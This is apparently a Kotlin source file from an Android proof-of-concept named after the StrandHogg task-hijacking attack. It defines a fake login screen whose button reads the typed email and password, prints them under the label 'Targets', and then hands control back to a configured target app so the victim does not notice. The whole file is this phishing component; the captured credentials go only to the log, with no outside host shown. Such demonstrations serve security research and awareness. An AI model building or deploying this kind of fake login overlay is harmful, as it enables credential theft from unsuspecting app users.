package dev.lucasnlm.strandhogg

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_login_form.*
import kotlinx.android.synthetic.main.activity_troll.*
import kotlinx.android.synthetic.main.activity_troll.backToOriginal
import kotlinx.android.synthetic.main.activity_troll.createNewAccount

class FakeLoginFormActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login_form)

        createNewAccount.setOnClickListener {
            var user = editTextTextEmailAddress.text.toString()
            var pass = editTextTextPassword.text.toString()
            println("Targets")
            println(user)
            println(pass)
        }

        backToOriginal.setOnClickListener {
            startOtherApp(getString(R.string.target_package))
            finish()
        }
    }
}
